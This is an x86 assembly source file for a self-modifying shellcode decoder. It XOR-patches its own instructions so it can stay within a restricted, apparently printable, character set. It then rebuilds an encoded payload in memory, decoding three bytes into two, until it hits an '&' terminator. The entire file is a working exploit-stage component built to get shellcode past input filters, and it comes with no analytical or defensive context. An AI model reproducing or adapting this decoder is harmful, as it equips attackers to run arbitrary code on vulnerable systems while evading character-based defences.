.text
.global anchor
initializer:
	#Set %eax value zero and %ecx beginning of shellcode
	pusha
	push	%eax
	pop	%ecx
	push	$0x30
	pop	%eax
	xor	$0x30,%al
	dec	%eax
	push	%eax
	pop	%ebx
xor_patcher:
	push	$0x30			
	pop	%eax
	xorb	%bl,0x35(%ecx)		#	0x72 -> 0x8D
	xorb	%al,0x4f(%ecx)		#	0x4F^0x30->0x7F
	xorb	%bl,0x4f(%ecx)		#	0x7F ->	0x80
	xorb	%bl,0x60(%ecx)		#	0x3F -> 0xC0
	xorb	%al,0x61(%ecx)		#	0x30^0x2C -> 0x1C
	xorb	%bl,0x61(%ecx)		#	0x1C -> 0xE3
	xorb	%al,0x62(%ecx)		#	0x30^0x34 -> 0x04
	xorb	%bl,0x69(%ecx)		#	0x3F -> 0xC0
	xorb	%al,0x6a(%ecx)		#	0x30^0x27 -> 0x17
	xorb	%bl,0x6a(%ecx)		#	0x17 -> 0xE8
	xorb	%al,0x6B(%ecx)		#	0x30^0x32 -> 0x02
	xorb	%bl,0x6D(%ecx)		#	0x27 -> 0xD8
	xorb	%bl,0x6E(%ecx)		#	0x77 -> 0x88
anchor:
	# Set ecx = ecx + 0x49
	.byte	0x72	#leal	0x49(%ecx),%ecx
	.byte	0x49
	.byte	0x49
	# Xor patcher
	xorb	%bl,0x37(%ecx)		#	0x3F -> 0xC0
	xorb	%al,0x38(%ecx)		#	0x30^0x2C -> 0x1C
	xorb	%bl,0x38(%ecx)		#	0x1C -> 0xE3
	xorb	%al,0x39(%ecx)		#	0x30^0x36 -> 0x06
	xorb	%bl,0x3D(%ecx)		#	0x27 -> 0xD8
	xorb	%bl,0x3E(%ecx)		#	0x77 -> 0x88
	xorb	%bl,0x47(%ecx)		#	0x41 -> 0xbe
	# set edx = ecx
	push	%ecx
	pop 	%edx
loop:
	# compare ecx value with & character if same then transfer
	control to end of shellcode
	.byte	0x4F	#cmpb   $0x26,0x49(%ecx)
	.byte	0x79
	.byte	0x49
	.byte	0x26
	je	end_of_payload

	# Set eax and ebx value 0
	push	$0x30
	pop	%eax
	xor	$0x30,%al
	push	%eax
	pop	%ebx

	# take 2 bytes in al and bl
	xorb	0x49(%ecx),%bl
	inc	%ebx
	.byte	0x3F	#shlb	$4,%bl	
	.byte	0x2C
	.byte	0x34
	xorb	0x4a(%ecx),%al
	inc	%eax
	andb	$0x3C,%al

	# recover first byte of shellcode from 2 bytes
	.byte	0x3F	#shrb	$2,%al
	.byte	0x27
	.byte	0x32
	.byte	0x30	#xorb	%bl,%al
	.byte	0x27
	.byte	0x77	#mov    %al,0x49(%edx)
	.byte	0x42
	.byte	0x49

	# Set eax and ebx value 0
	push	$0x30
	pop	%eax
	xor	$0x30,%al
	push	%eax
	pop	%ebx

	# take 2 bytes in al and bl
	xor	0x4a(%ecx),%bl
	inc	%ebx
	xor	0x4b(%ecx),%al
	inc	%eax
	
	# recover second byte of shellcode from 2 bytes
	.byte	0x3F	# shlb	$6,%bl	
	.byte	0x2C
	.byte	0x36
	andb	$0x3F,%al
	.byte	0x30	# xorb	%bl,%al
	.byte	0x27
	.byte	0x77	# mov    %al,0x4a(%edx)
	.byte	0x42
	.byte	0x4a

	#increment ecx(get) by and edx(set) by 2
	inc	%edx
	inc 	%edx
	inc	%ecx
	inc	%ecx
	inc	%ecx

	# jump start at loop
	.byte	0x75  # jne loop
	.byte	0x41
end_of_payload:
	popa	
end:
